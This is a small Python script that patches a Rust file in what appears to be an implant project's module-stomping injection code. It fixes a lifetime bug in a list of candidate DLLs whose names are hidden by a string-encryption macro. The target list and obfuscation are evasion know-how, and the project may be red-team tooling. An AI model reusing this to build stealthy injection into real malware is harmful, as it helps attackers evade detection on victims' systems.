import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# fix the enc_str! macro in vec causing temporary value drop
text = text.replace('''let candidates = vec![

    &enc_str!("msfte.dll")[..],
    &enc_str!("msratelc.dll")[..],
    &enc_str!("scrobj.dll")[..],
    &enc_str!("amstream.dll")[..]

            ];''', '''
            let s1 = enc_str!("msfte.dll");
            let s2 = enc_str!("msratelc.dll");
            let s3 = enc_str!("scrobj.dll");
            let s4 = enc_str!("amstream.dll");
            let candidates: Vec<&[u8]> = vec![&s1[..], &s2[..], &s3[..], &s4[..]];
            ''')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

